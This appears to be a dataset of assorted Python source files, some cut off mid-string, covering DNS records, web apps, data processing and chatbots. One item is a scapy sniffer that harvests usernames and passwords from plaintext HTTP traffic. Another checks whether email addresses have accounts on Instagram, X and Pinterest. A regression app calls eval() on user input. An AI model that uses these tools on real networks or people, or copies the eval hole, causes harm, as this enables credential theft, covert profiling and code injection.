self._as_uint16(original_id)\n        self.error = dns.rcode.Rcode.make(error)\n        self.other = self._as_bytes(other)\n\n    def to_text(self, origin=None, relativize=True, **kw):\n        algorithm = self.algorithm.choose_relativity(origin, relativize)\n        error = dns.rcode.to_text(self.error, True)\n        text = (\n            f\"{algorithm} {self.time_signed} {self.fudge} \"\n            + f\"{len(self.mac)} {dns.rdata._base64ify(self.mac, 0)} \"\n            + f\"{self.original_id} {error} {len(self.other)}\"\n        )\n        if self.other:\n            text += f\" {dns.rdata._base64ify(self.other, 0)}\"\n        return text\n\n    @classmethod\n    def from_text(\n        cls, rdclass, rdtype, tok, origin=None, relativize=True, relativize_to=None\n    ):\n        algorithm = tok.get_name(relativize=False)\n        time_signed = tok.get_uint48()\n        fudge = tok.get_uint16()\n        mac_len = tok.get_uint16()\n        mac = base64.b64decode(tok.get_string())\n        if len(mac) != mac_len:\n            raise SyntaxError(\"invalid MAC\")\n        original_id = tok.get_uint16()\n        error = dns.rcode.from_text(tok.get_string())\n        other_len = tok.get_uint16()\n        if other_len > 0:\n            other = base64.b64decode(tok.get_string())\n            if len(other) != other_len:\n                raise SyntaxError(\"invalid other data\")\n        else:\n            other = b\"\"\n        return cls(\n            rdclass,\n            rdtype,\n            algorithm,\n            time_signed,\n            fudge,\n            mac,\n            original_id,\n            error,\n            other,\n        )\n\n    def _to_wire(self, file, compress=None, origin=None, canonicalize=False):\n        self.algorithm.to_wire(file, None, origin, False)\n        file.write(\n            struct.pack(\n                \"!HIHH\",\n                (self.time_signed >> 32) & 0xFFFF,\n                self.time_signed & 0xFFFFFFFF,\n                self.fudge,\n                len(self.mac),\n            )\n        )\n        file.write(self.mac)\n        file.write(struct.pack(\"!HHH\", self.original_id, self.error, len(self.other)))\n        file.write(self.other)\n\n    @classmethod\n    def from_wire_parser(cls, rdclass, rdtype, parser, origin=None):\n        algorithm = parser.get_name()\n        time_signed = parser.get_uint48()\n        fudge = parser.get_uint16()\n        mac = parser.get_counted_bytes(2)\n        (original_id, error) = parser.get_struct(\"!HH\")\n        other = parser.get_counted_bytes(2)\n        return cls(\n            rdclass,\n            rdtype,\n            algorithm,\n            time_signed,\n            fudge,\n            mac,\n            original_id,\n            error,\n            other,\n        )\n",
    "import scapy.all as scapy\r\nimport argparse\r\nfrom scapy.layers import http\r\n\r\ndef get_interface():\r\n    \"\"\"Get the network interface from the command line or list available interfaces.\"\"\"\r\n    parser = argparse.ArgumentParser(description=\"HTTP traffic sniffer\")\r\n    parser.add_argument(\"-i\", \"--interface\", dest=\"interface\", help=\"Specify the interface to sniff traffic\")\r\n    arguments = parser.parse_args()\r\n\r\n    if arguments.interface:\r\n        return arguments.interface\r\n\r\n    # If no interface is provided, list available ones\r\n    interfaces = scapy.get_if_list()\r\n    print(\"[*] Available interfaces:\")\r\n    for idx, iface in enumerate(interfaces, start=1):\r\n        print(f\"{idx}. {iface}\")\r\n\r\n    while True:\r\n        try:\r\n            choice = int(input(\"Enter the number of the interface to use: \"))\r\n            if 1 <= choice <= len(interfaces):\r\n                return interfaces[choice - 1]\r\n            else:\r\n                print(f\"[!] Invalid choice. Please select a number between 1 and {len(interfaces)}.\")\r\n        except ValueError:\r\n            print(\"[!] Invalid input. Please enter a valid number.\")\r\n\r\ndef sniff(iface):\r\n    \"\"\"Sniff packets on the specified interface.\"\"\"\r\n    try:\r\n        print(f\"[*] Starting packet sniffing on interface: {iface}\")\r\n        scapy.sniff(iface=iface, store=False, prn=process_packet)\r\n    except PermissionError:\r\n        print(\"[!] Permission denied. Please run the script as root.\")\r\n    except Exception as e:\r\n        print(f\"[!] Error: {e}\")\r\n\r\ndef process_packet(packet):\r\n    \"\"\"Process each captured packet.\"\"\"\r\n    if packet.haslayer(http.HTTPRequest):\r\n        try:\r\n            # Get Host and Path\r\n            host = packet[http.HTTPRequest].Host.decode() if packet[http.HTTPRequest].Host else \"Unknown\"\r\n            path = packet[http.HTTPRequest].Path.decode() if packet[http.HTTPRequest].Path else \"Unknown\"\r\n            dest_ip = packet[scapy.IP].dst  # Destination IP address\r\n            print(f\"[+] HTTP Request >> {host}{path} (Destination: {dest_ip})\")\r\n        except AttributeError:\r\n            print(\"[!] Error decoding HTTP host/path or retrieving destination address\")\r\n\r\n        # Check for potential username/password data in the payload\r\n        if packet.haslayer(scapy.Raw):\r\n            try:\r\n                load = packet[scapy.Raw].load.decode(errors=\"ignore\")  # Decode byte string\r\n                keys = [\"username\", \"password\", \"pass\", \"email\"]\r\n                for key in keys:\r\n                    if key in load.lower():  # Case-insensitive match for keys\r\n                        print(f\"[+] Possible credential detected >> {load}\")\r\n                        break\r\n            except Exception as e:\r\n                print(f\"[!] Error processing Raw load: {e}\")\r\n\r\n# Main script execution\r\niface = get_interface()\r\nsniff(iface)\r\n",
    "import random\r\nimport string\r\n\r\ndef generate_password(min_length, numbers=True, special_characters=True):\r\n    letters = string.ascii_letters\r\n    digits = string.digits\r\n    special = string.punctuation\r\n\r\n    characters = letters    \r\n    if numbers:\r\n        characters += digits\r\n\r\n    if special_characters:\r\n        characters += special\r\n\r\n    pwd = \"\"\r\n    meets_criteria = False\r\n    has_number = False\r\n    has_special = False\r\n\r\n    while not meets_criteria or len(pwd) < min_length:\r\n        new_char = random.choice(characters)\r\n        pwd += new_char\r\n\r\n        if new_char in digits:\r\n            has_number = True   \r\n        elif new_char in special:\r\n            has_special = True\r\n\r\n        meets_criteria = True\r\n        if numbers:\r\n            meets_criteria = has_number\r\n        if special_characters:\r\n            meets_criteria = meets_criteria and has_special\r\n        \r\n    return pwd\r\n\r\nmin_length = int(input(\"Enter the minimum length: \"))\r\nhas_numbers = input(\"Do you want to have numbers (y/n)? \").lower() == \"y\"\r\nhas_special = input(\"Do you want to have special characters (y/n)? \").lower() == \"y\"\r\npwd = generate_password(min_length, has_numbers, has_special)\r\nprint(\"The generated password is:\", pwd)\r\n",
    "import streamlit as st\nimport numpy as np\nimport matplotlib.pyplot as plt\nfrom sklearn.linear_model import LinearRegression\nfrom sklearn.metrics import mean_squared_error, r2_score\n\n# Titre de l'application\nst.title(\"Application de R\u00e9gression Lin\u00e9aire\")\nst.write(\"Cette application permet de r\u00e9aliser une analyse de r\u00e9gression lin\u00e9aire avec des donn\u00e9es personnalisables.\")\n\n# Entr\u00e9e des donn\u00e9es\nst.header(\"Entr\u00e9e des Donn\u00e9es\")\nst.write(\"Modifiez les donn\u00e9es ci-dessous pour voir les r\u00e9sultats mis \u00e0 jour.\")\n\n# Saisie des donn\u00e9es\nx_input = st.text_area(\"Entrez les valeurs de x (s\u00e9par\u00e9es par des virgules)\", \"1/1.192, 1/2.517, 1/4.571, 1/9.484\")\ny_input = st.text_area(\"Entrez les valeurs de y correspondantes (s\u00e9par\u00e9es par des virgules)\", \"3.76, 3.04, 2.76, 2.54\")\n\n# Transformation des donn\u00e9es saisies\ntry:\n    x = np.array([eval(i) for i in x_input.split(\",\")])\n    y = np.array([float(i) for i in y_input.split(\",\")])\n\n    if len(x) != len(y):\n        st.error(\"Les longueurs de x et y doivent \u00eatre identiques.\")\n    else:\n        # Calcul manuel des param\u00e8tres\n        n = np.size(x)\n        x_mean, y_mean = np.mean(x), np.mean(y)\n\n        Sxy = np.sum(x * y) - n * x_mean * y_mean\n        Sxx = np.sum(x * x) - n * x_mean * x_mean\n\n        b1 = Sxy / Sxx\n        b0 = y_mean - b1 * x_mean\n        y_pred_manual = b1 * x + b0\n\n        # Erreur manuelle\n        error = y - y_pred_manual\n        se = np.sum(error**2)\n        mse_manual = se / n\n        rmse_manual = np.sqrt(mse_manual)\n        SSt = np.sum((y - y_mean)**2)\n        R2_manual = 1 - (se / SSt)\n\n        # R\u00e9gression avec Scikit-learn\n        x = x.reshape(-1, 1)\n        model = LinearRegression()\n        model.fit(x, y)\n        y_pred_sklearn = model.predict(x)\n\n        mse_sklearn = mean_squared_error(y, y_pred_sklearn)\n        rmse_sklearn = np.sqrt(mse_sklearn)\n        r2_sklearn = r2_score(y, y_pred_sklearn)\n\n        # R\u00e9sultats de la r\u00e9gression\n        st.header(\"R\u00e9sultats de la R\u00e9gression\")\n        st.write(\"### Calcul manuel\")\n        st.write(f\"- Slope (b1): {b1}\")\n        st.write(f\"- Intercept (b0): {b0}\")\n        st.write(f\"- MSE: {mse_manual}\")\n        st.write(f\"- RMSE: {rmse_manual}\")\n        st.write(f\"- R\u00b2: {R2_manual}\")\n\n        st.write(\"### Scikit-learn\")\n        st.write(f\"- Slope: {model.coef_[0]}\")\n        st.write(f\"- Intercept: {model.intercept_}\")\n        st.write(f\"- MSE: {mse_sklearn}\")\n        st.write(f\"- RMSE: {rmse_sklearn}\")\n        st.write(f\"- R\u00b2: {r2_sklearn}\")\n\n        # Visualisation\n        st.header(\"Visualisation\")\n        fig, ax = plt.subplots()\n        ax.scatter(x, y, color='red', label='Donn\u00e9es')\n        ax.plot(x, y_pred_manual, color='green', label='R\u00e9gression (manuel)')\n        ax.plot(x, y_pred_sklearn, color='blue', linestyle='dashed', label='R\u00e9gression (Scikit-learn)')\n        ax.set_xlabel(\"1/pm\")\n        ax.set_ylabel(\"Permeability\")\n        ax.legend()\n        st.pyplot(fig)\n\nexcept Exception as e:\n    st.error(f\"Erreur dans l'entr\u00e9e des donn\u00e9es : {e}\")\n",
    "import pandas as pd\nimport numpy as np\n\ndef process_data(df: pd.DataFrame, columns_to_impute: list, target_column: str = None) -> tuple[pd.DataFrame, pd.Series]:\n    \"\"\"\n    Procesa los datos:\n    - Imputa los valores faltantes\n    - Escalar las variables num\u00e9ricas\n\n    Args:\n       data (pd.DataFrame): DataFrame con los datos a procesar.\n\n    Returns:\n       pd.DataFrame: DataFrame con los datos procesados\n    \"\"\"\n    df[columns_to_impute] = df[columns_to_impute].replace(0, np.nan)\n    df.loc[(df['Glucose'] == 0) & (df['SkinThickness'].isnull()), 'Glucose'] = np.nan\n    df.loc[(df['Glucose'] == 0) & (df['BloodPressure'].isnull()), 'Glucose'] = np.nan\n    df.loc[(df['Glucose'] == 0) & (df['BMI'].isnull()), 'Glucose'] = np.nan\n    df.loc[(df['Insulin'] == 0) & (df['SkinThickness'].isnull()), 'Insulin'] = np.nan\n    df.loc[(df['Insulin'] == 0) & (df['BloodPressure'].isnull()), 'Insulin'] = np.nan\n    df.loc[(df['Insulin'] == 0) & (df['BMI'].isnull()), 'Insulin'] = np.nan\n    df['Glucose'] = df['Glucose'].replace(0, np.nan)\n    df.loc[(df['Insulin'] == 0) & (df['Glucose'].isnull()), 'Insulin'] = np.nan\n    df['Insulin'] = df['Insulin'].replace(0, np.nan)\n    \n    target = df[target_column] if target_column else None\n    \n    return df, target\n    \n    \n",
    "from flask import Flask, jsonify, request\nimport pandas as pd\nimport os\n\napp = Flask(__name__)\ncaminho = os.path.abspath(__file__)\ndiretorio = os.path.dirname(caminho)\n\n# TO-DO: Autentica\u00e7\u00e3o\n# TO-DO: Refatorar para reusar c\u00f3digo\n\n@app.route(\"/\")\ndef get_root():\n    return \"API Tech Challenge FIAP\"\n\n# Endpoint para extrair dados referente ao menu 'Produ\u00e7\u00e3o'\n@app.route('/api/v1/producao', methods=['GET'])\ndef get_producao():\n    dados_producao = pd.read_csv(diretorio + '/banco_dados/producao.csv', sep=';')\n    \n    # TO-DO: Mover para uma fun\u00e7\u00e3o\n    ano = request.args.get('ano')\n    cod_produto = request.args.get('cod_produto')\n    if(ano):\n        dados_producao = dados_producao[dados_producao['ano'] == int(ano)]\n    if cod_produto:\n        dados_producao = dados_producao[dados_producao['cod_produto'] == cod_produto]\n        \n    json_data = dados_producao.to_json(orient='records')\n    return jsonify(json_data)\n\n\n# Endpoint para extrair dados referente ao menu 'Comercializa\u00e7\u00e3o'\n@app.route('/api/v1/comercio', methods=['GET'])\ndef get_comercio():\n    dados_comercio = pd.read_csv(diretorio + '/banco_dados/comercio.csv', sep=';')\n    \n    # TO-DO: Mover para uma fun\u00e7\u00e3o\n    ano = request.args.get('ano')\n    cod_produto = request.args.get('cod_produto')\n    if(ano):\n        dados_comercio = dados_comercio[dados_comercio['ano'] == int(ano)]\n    if cod_produto:\n        dados_comercio = dados_comercio[dados_comercio['cod_produto'] == cod_produto]\n        \n    json_data = dados_comercio.to_json(orient='records')\n    return jsonify(json_data)\n\n\nif __name__ == '__main__':\n    app.run(debug=True)",
    "# -*- coding: utf-8\r\n# Reinaldo Chaves (reichaves@gmail.com)\r\n# Este projeto implementa um sistema de Recupera\u00e7\u00e3o de Informa\u00e7\u00f5es Aumentada por Gera\u00e7\u00e3o (RAG) conversacional \r\n# usando Streamlit, LangChain, e modelos de linguagem de grande escala - para entrevistar PDFs\r\n# Gera\u00e7\u00e3o de respostas usando o modelo sabia-3 da Maritaca AI especializado em Portugu\u00eas do Brasil\r\n# Embeddings de texto usando o modelo all-MiniLM-L6-v2 do Hugging Face\r\n##\r\n\r\n\"\"\"\r\nChatbot com RAG (Retrieval Augmented Generation) para PDFs usando MaritacaAI\r\n\r\nEste script implementa um chatbot que pode analisar documentos PDF usando:\r\n- Streamlit para interface web\r\n- LangChain para processamento de documentos e gerenciamento de chat\r\n- Modelo sabia-3 da Maritaca AI para gera\u00e7\u00e3o de respostas em Portugu\u00eas\r\n- Embeddings do Hugging Face para processamento de texto\r\n\r\n\"\"\"\r\n\r\n# Importa\u00e7\u00e3o das bibliotecas principais\r\nimport streamlit as st  # Framework para interface web\r\nimport os  # Opera\u00e7\u00f5es do sistema operacional\r\nimport tempfile  # Manipula\u00e7\u00e3o de arquivos tempor\u00e1rios\r\nfrom typing import List, Dict, Any, Optional  # Tipos para type hints\r\nfrom tenacity import retry, stop_after_attempt, wait_exponential  # Gerenciamento de retentativas\r\nfrom cachetools import TTLCache  # Cache com tempo de vida\r\nimport logging  # Sistema de logging\r\nfrom datetime import datetime  # Manipula\u00e7\u00e3o de datas\r\n\r\n# Configura\u00e7\u00e3o do sistema de logging para debug e monitoramento\r\nlogging.basicConfig(\r\n    level=logging.INFO,\r\n    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'\r\n)\r\nlogger = logging.getLogger(__name__)\r\n\r\n# Desativa paralelismo dos tokenizers para evitar deadlocks\r\nos.environ[\"TOKENIZERS_PARALLELISM\"] = \"false\"\r\n\r\n# Importa\u00e7\u00f5es do LangChain para processamento de documentos e chat\r\nfrom langchain.chains import create_history_aware_retriever, create_retrieval_chain\r\nfrom langchain.chains.combine_documents import create_stuff_documents_chain\r\nfrom langchain_community.chat_message_histories import ChatMessageHistory\r\nfrom langchain_core.chat_history import BaseChatMessageHistory\r\nfrom langchain_core.prompts import ChatPromptTemplate, MessagesPlaceholder\r\nfrom langchain_core.runnables.history import RunnableWithMessageHistory\r\nfrom langchain_huggingface import HuggingFaceEmbeddings\r\nfrom langchain_text_splitters import RecursiveCharacterTextSplitter\r\nfrom langchain_community.document_loaders import PyPDFLoader\r\nfrom langchain_community.vectorstores import FAISS\r\nfrom langchain_core.runnables import Runnable\r\nfrom maritalk import MariTalk\r\n\r\n# Cache para armazenar embeddings e melhorar performance\r\nembeddings_cache = TTLCache(maxsize=100, ttl=3600)  # Cache por 1 hora\r\n\r\nclass MariTalkWrapper(Runnable):\r\n    \"\"\"\r\n    Wrapper para integrar o modelo MaritacaAI com o LangChain.\r\n    Gerencia a comunica\u00e7\u00e3o com a API e formata mensagens.\r\n    \"\"\"\r\n    \r\n    def __init__(self, maritalk_model: Any, max_retries: int = 3, timeout: int = 30):\r\n        \"\"\"\r\n        Inicializa o wrapper com configura\u00e7\u00f5es de retry e timeout\r\n        \"\"\"\r\n        self.maritalk_model = maritalk_model\r\n        self.max_retries = max_retries\r\n        self.timeout = timeout\r\n\r\n    @retry(stop=stop_after_attempt(3), wait=wait_exponential(multiplier=1, min=4, max=10))\r\n    def invoke(self, input: Any, config: Optional[Dict] = None) -> str:\r\n        \"\"\"\r\n        Processa entrada e gera resposta, com retries autom\u00e1ticos em caso de falha.\r\n        Suporta diferentes formatos de entrada: ChatPromptValue, dict, string\r\n        \"\"\"\r\n        try:\r\n            # Processamento de ChatPromptValue (formato LangChain)\r\n            if hasattr(input, \"to_messages\"):\r\n                messages = input.to_messages()\r\n                formatted_messages = self._format_messages(messages)\r\n                response = self.maritalk_model.generate(formatted_messages)\r\n                if isinstance(response, str):\r\n                    return response\r\n                elif isinstance(response, dict) and 'text' in response:\r\n                    return response['text']\r\n                else:\r\n                    return response[0]['content'] if isinstance(response, list) else str(response)\r\n            \r\n            # Processamento de dicion\u00e1rio\r\n            elif isinstance(input, dict):\r\n                if \"messages\" in input:\r\n                    messages = input[\"messages\"]\r\n                    formatted_messages = self._format_messages(messages)\r\n                    response = self.maritalk_model.generate(formatted_messages)\r\n                    if isinstance(response, str):\r\n                        return response\r\n                    elif isinstance(response, dict) and 'text' in response:\r\n                        return response['text']\r\n                    else:\r\n                        return response[0]['content'] if isinstance(response, list) else str(response)\r\n                elif \"answer\" in input:\r\n                    return str(input[\"answer\"])\r\n                else:\r\n                    return se",
    "def read_first_n_lines(file_path, n=500):\n    \"\"\"\n    Read the first `n` lines from a file and return them as a list of strings.\n    \n    :param file_path: Path to the text file to read.\n    :param n: Number of lines to read. Default is 500.\n    :return: List containing the first `n` lines of the file.\n    \"\"\"\n    lines = []\n    with open(file_path, 'r', encoding='utf-8') as file:\n        for idx, line in enumerate(file):\n            if idx == n:\n                break\n            lines.append(line.strip())\n    return lines\n\ndef write_lines_to_file(lines, output_file_path):\n    \"\"\"\n    Write lines to an output file.\n    \n    :param lines: List of strings to write to the file.\n    :param output_file_path: Path to the output file.\n    \"\"\"\n    with open(output_file_path, 'w', encoding='utf-8') as file:\n        for line in lines:\n            file.write(line + '\\n')\n\ndef main(input_file_path, output_file_path, num_lines=500):\n    \"\"\"\n    Main function to read the first `num_lines` from `input_file_path` and save them to `output_file_path`.\n    \n    :param input_file_path: The path to the large text file.\n    :param output_file_path: The path where to save the first `num_lines`.\n    :param num_lines: The number of lines to read and save.\n    \"\"\"\n    # Read the first `num_lines` from the input file\n    first_n_lines = read_first_n_lines(input_file_path, num_lines)\n    \n    # Optionally print the lines to console (uncomment the next line if you want to print to console)\n    # for line in first_n_lines: print(line)\n    \n    # Write the first `num_lines` to the output file\n    write_lines_to_file(first_n_lines, output_file_path)\n\nif __name__ == \"__main__\":\n    # Define your input and output file paths here\n    input_file_path = '/mnt/petrelfs/zhujiawei/Projects/donut-master/synthdog/list_cn_en/part_cn_en_01.txt'\n    output_file_path = '/mnt/petrelfs/zhujiawei/Projects/donut-master/synthdog/list_cn_en/part_cn_en_500.txt'\n    \n    # Call the main function to process the files\n    main(input_file_path, output_file_path, num_lines=500)",
    "import json\nfrom dataclasses import dataclass\nfrom typing import Optional\n\nfrom bs4 import BeautifulSoup\nfrom fake_useragent import FakeUserAgent\nfrom requests import Session\n\nfrom utils import log_colorize\nfrom utils.abc import BaseModule\nfrom utils.consts import OSINT_BANNER\n\n\n@dataclass\nclass Response:\n    status_code: int\n    message: Optional[str]\n    error: Optional[str]\n\n\nclass EmailTracker(BaseModule, name=\"tracker\"):\n    def __init__(self) -> None:\n        self.session: Session = Session()\n        self._user_agent: FakeUserAgent = FakeUserAgent()\n\n    def try_instagram(self, email: str) -> Response:\n        headers: dict = {\n            'User-Agent': self._user_agent.random,\n            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',\n            'Accept-Language': 'en-US,en;q=0.5',\n            'Origin': 'https://www.instagram.com',\n            'Connection': 'keep-alive',\n            'Referer': 'https://www.instagram.com/'\n        }\n\n        try:\n            response = self.session.get(\n                \"https://www.instagram.com/accounts/emailsignup/\",\n                headers=headers\n            )\n            if response.status_code == 200:\n                if 'csrftoken' in self.session.cookies:\n                    token = self.session.cookies['csrftoken']\n                else:\n                    return Response(\n                        status_code=response.status_code,\n                        message=None,\n                        error=\"Instagram signup token cannot be found in cookies.\"\n                    )\n            else:\n                return Response(\n                    status_code=response.status_code,\n                    message=None,\n                    error=\"Unable to process a status other than 200.\"\n                )\n\n            headers[\"x-csrftoken\"] = token\n            headers[\"Referer\"] = \"https://www.instagram.com/accounts/emailsignup/\"\n\n            response = self.session.post(\n                url=\"https://www.instagram.com/api/v1/web/accounts/web_create_ajax/attempt/\",\n                headers=headers,\n                data={\n                    \"osint\": email\n                }\n            )\n            if response.status_code == 200:\n                if (\n                        (\"Another account is using the same osint.\" in response.text)\n                        or (\"email_is_taken\" in response.text)\n                ):\n                    return Response(\n                        status_code=response.status_code,\n                        message=\"Account registered.\",\n                        error=None\n                    )\n                else:\n                    return Response(\n                        status_code=response.status_code,\n                        message=None,\n                        error=\"Account not registered.\"\n                    )\n            else:\n                return Response(\n                    status_code=response.status_code,\n                    message=None,\n                    error=\"Unknown status code.\"\n                )\n        except Exception as e:\n            return Response(\n                status_code=400,\n                message=None,\n                error=f\"We get an exception while requesting: {e}.\"\n            )\n\n    def try_x(self, email: str) -> Response:\n        try:\n            response = self.session.get(\n                url=\"https://api.x.com/i/users/email_available.json\",\n                params={\n                    \"osint\": email\n                }\n            )\n            if response.status_code == 200:\n                if response.json().get(\"taken\"):\n                    return Response(\n                        status_code=response.status_code,\n                        message=\"Account registered.\",\n                        error=None\n                    )\n                else:\n                    return Response(\n                        status_code=response.status_code,\n                        message=None,\n                        error=\"Account not registered.\"\n                    )\n            else:\n                return Response(\n                    status_code=response.status_code,\n                    message=None,\n                    error=\"Unknown status code.\"\n                )\n        except Exception as e:\n            return Response(\n                status_code=400,\n                message=None,\n                error=f\"We get an exception while requesting: {e}.\"\n            )\n\n    def try_pinterest(self, email: str) -> Response:\n        try:\n            response = self.session.get(\n                \"https://www.pinterest.com/_ngjs/resource/EmailExistsResource/get/\",\n                params={\n                    \"source_url\": \"/\",\n                    \"data\": json.dumps({\"options\": {\"osint\": email}, \"context\": {}})\n                }\n            )\n\n            if response.status_code == 200:\n                data = response.json()\n                if (data[\"resource_response\"][\"messa",
    "import time\nimport logging\nimport threading\nimport pexpect\nimport enum\nimport types\n\nclass BareSIP:\n\n    # Types\n    class Event(enum.Enum):\n        READY = \"READY\",\n        CALLING = \"CALLING\",\n        ANSWERED = \"ANSWERED\",\n        INCOMING_CALL = \"INCOMING_CALL\",\n        TERMINATED = \"TERMINATED\",\n        UA_REGISTED = \"UA_REGISTED\",\n\n    class UserAgent:\n        def __init__(self, user: str, domain: str, registered: bool, uri: str):\n            self.user = user\n            self.domain = domain\n            self.registered = registered\n            self.uri = uri\n            self._current_call = None\n\n        def __str__(self):\n            return f\"User: {self.user}, Domain: {self.domain}, Registered: {self.registered}, URI: {self.uri}\"\n    \n        def __repr__(self):\n            return self.__str__()\n\n    # TODO - Implement configuration\n    # from baresip_configuration import BareSIPConfiguration\n\n    # Con/descructors\n    def __init__(self, debug=False):\n        ## Configuration\n        self._debug = debug\n        self._timeout = 10 # 10 Second default timeout for essential tasks\n        self._timeout_check_frequency = 1000 # Hz\n        self._logger = None\n\n        ## Process, Thread, States\n        self._process = None\n        self._thread = None\n        self._stop_event = threading.Event()\n        self._is_running = False\n        self._is_ready = False\n\n        # Objects\n        self._user_agents = []\n\n        ## Response queues (semaphores)\n        self._semaphore_user_agents = 0\n\n        # Public\n        @property\n        def is_running(self):\n            return self._is_running\n        \n        def is_ready(self):\n            return self._is_ready\n\n        ## Callbacks\n        self._callbacks = {\n            self.Event.READY: None,\n            self.Event.INCOMING_CALL: None,\n            self.Event.CALLING: None,\n            self.Event.ANSWERED: None,\n            self.Event.TERMINATED: None,\n            self.Event.UA_REGISTED: None,\n        }\n\n        ## Logger Setup\n        logging.basicConfig(level=logging.DEBUG if debug else logging.WARNING)\n\n        self._logger = logging.getLogger(self.__class__.__name__)\n        self._logger.propagate = 0\n        ch = logging.StreamHandler()\n        ch.setLevel(logging.DEBUG if debug else logging.WARNING)\n        ch.setFormatter(self._BareSIPLogFormatter())\n        self._logger.addHandler(ch)\n\n    def __del__(self):\n        if self._process:\n            self.stop()\n\n    class _BareSIPLogFormatter(logging.Formatter):\n\n        cyan = \"\\x1b[36m\"\n        grey = \"\\x1b[38;20m\"\n        yellow = \"\\x1b[33;20m\"\n        red = \"\\x1b[31;20m\"\n        bold_red = \"\\x1b[31;1m\"\n        reset = \"\\x1b[0m\"\n        format = \"%(levelname)s : %(name)s : %(message)s\"\n\n        FORMATS = {\n            logging.DEBUG: cyan + format + reset,\n            logging.INFO: grey + format + reset,\n            logging.WARNING: yellow + format + reset,\n            logging.ERROR: red + format + reset,\n            logging.CRITICAL: bold_red + format + reset\n        }\n\n        def format(self, record):\n            log_fmt = self.FORMATS.get(record.levelno)\n            formatter = logging.Formatter(log_fmt)\n            return formatter.format(record)\n\n    # Private methods\n    def _send(self, command: str) -> bool:\n        if self._is_ready:\n            self._process.sendline(command)\n            return True\n        else:\n            self._logger.error(\"attempt to write while process is not running\")\n            return False\n \n    def _parse(self):\n        self._logger.debug(\"output parser active\")\n\n        while not self._stop_event.is_set():\n            self._process_line()\n\n        self._logger.debug(\"output parser stopped\")\n\n    def _process_line(self):\n        try:\n            # TODO - compile list pattern\n            expectations = [\n                \"baresip is ready.\",\n                \"--- User Agents \",\n                \"useragent registered successfully\",\n                \"Incoming call from: \",\n                \"Call in-progress: \",\n                \"could not find UA\",\n                \"Call answered: \",\n                \"session closed\",\n            ]\n\n            # print(self._process.readline().strip())\n\n            expectation = expectations[self._process.expect(expectations, timeout=0)]\n        \n            if expectation == \"baresip is ready.\":\n                self._is_ready = True\n\n                self._logger.debug(\"baresip is ready\")\n\n                if isinstance(self._callbacks[self.Event.READY], types.FunctionType):\n                    self._callbacks[self.Event.READY]()\n\n                return\n            \n            if expectation == \"--- User Agents \":\n                # Process output format: \"--- User Agents (#)\"\n                # .......................\"0: <sip:user@domain> - OK\"\n                # .......................\"1: <sip:user@domain> - zzz\"\n                line = self._process.readline().strip()\n                agents_count = int(line[line.index(\"(\") + 1:line.index(\")\")])",
    "import numpy as np\nimport soundfile as sf\nimport sounddevice as sd\nfrom datetime import datetime\nfrom pathlib import Path\nfrom typing import Tuple, Optional\n\n\ndef save_audio_file(\n    audio_data: np.ndarray, output_dir: Path, sample_rate: int = 24000\n) -> Path:\n    \"\"\"\n    Save audio data to a WAV file with a timestamp in the filename.\n\n    Args:\n        audio_data (np.ndarray): The audio data to save. Can be a single array or a list of arrays.\n        output_dir (Path): The directory to save the audio file in.\n        sample_rate (int, optional): The sample rate of the audio data. Defaults to 24000.\n\n    Returns:\n        Path: The path to the saved audio file.\n    \"\"\"\n    timestamp = datetime.now().strftime(\"%Y%m%d_%H%M%S\")\n    output_path = output_dir / f\"output_{timestamp}.wav\"\n\n    if isinstance(audio_data, list):\n        audio_data = np.concatenate(audio_data)\n\n    sf.write(str(output_path), audio_data, sample_rate)\n    return output_path\n\n\ndef play_audio(\n    audio_data: np.ndarray, sample_rate: int = 24000\n) -> Tuple[bool, Optional[np.ndarray]]:\n    \"\"\"\n    Play audio data using sounddevice.\n\n    Args:\n        audio_data (np.ndarray): The audio data to play.\n        sample_rate (int, optional): The sample rate of the audio data. Defaults to 24000.\n\n    Returns:\n        Tuple[bool, Optional[np.ndarray]]: A tuple containing a boolean indicating if the playback was interrupted (always False here) and an optional numpy array representing the interrupted audio (always None here).\n    \"\"\"\n    sd.play(audio_data, sample_rate)\n    sd.wait()\n    return False, None\n",
    "import streamlit as st\r\nimport pandas as pd\r\nimport plotly.graph_objects as go\r\nimport yfinance as yf\r\nfrom phi.agent.agent import Agent\r\nfrom phi.model.groq import Groq\r\nfrom phi.tools.yfinance import YFinanceTools\r\nfrom phi.tools.duckduckgo import DuckDuckGo\r\nfrom phi.tools.googlesearch import GoogleSearch\r\n\r\nGROQ_API_KEY = \"\" \r\n\r\nCOMMON_STOCKS = {\r\n    'NVIDIA': 'NVDA', 'APPLE': 'AAPL', 'GOOGLE': 'GOOGL', 'MICROSOFT': 'MSFT',\r\n    'TESLA': 'TSLA', 'AMAZON': 'AMZN', 'META': 'META', 'NETFLIX': 'NFLX',\r\n    'TCS': 'TCS.NS', 'RELIANCE': 'RELIANCE.NS', 'INFOSYS': 'INFY.NS',\r\n    'WIPRO': 'WIPRO.NS', 'HDFC': 'HDFCBANK.NS', 'TATAMOTORS': 'TATAMOTORS.NS',\r\n    'ICICIBANK': 'ICICIBANK.NS', 'SBIN': 'SBIN.NS'\r\n}\r\n\r\nst.set_page_config(page_title=\"Stocks Analysis AI Agents\", page_icon=\"\", layout=\"wide\")\r\n\r\nst.markdown(\"\"\"\r\n    <style>\r\n    .main { padding: 2rem; }\r\n    .stApp { max-width: 1400px; margin: 0 auto; }\r\n    .card {\r\n        background: linear-gradient(135deg, #f6f8fa 0%, #ffffff 100%);\r\n        border-radius: 15px;\r\n        padding: 1.5rem;\r\n        margin: 1rem 0;\r\n        box-shadow: 0 4px 6px rgba(0,0,0,0.1);\r\n        border: 1px solid #e1e4e8;\r\n    }\r\n    .metric-value {\r\n        font-size: 24px;\r\n        font-weight: bold;\r\n        color: #0366d6;\r\n    }\r\n    .metric-label {\r\n        font-size: 14px;\r\n        color: #586069;\r\n        text-transform: uppercase;\r\n    }\r\n    .chart-container {\r\n        background: white;\r\n        border-radius: 15px;\r\n        padding: 1rem;\r\n        margin: 1rem 0;\r\n        border: 1px solid #e1e4e8;\r\n    }\r\n    </style>\r\n    \"\"\", unsafe_allow_html=True)\r\n\r\ndef initialize_agents():\r\n    if not st.session_state.get('agents_initialized', False):\r\n        try:\r\n            st.session_state.web_agent = Agent(\r\n                name=\"Web Search Agent\",\r\n                role=\"Search the web for information\",\r\n                model=Groq(api_key=GROQ_API_KEY),\r\n                tools=[GoogleSearch(fixed_max_results=5), DuckDuckGo(fixed_max_results=5)]\r\n            )\r\n            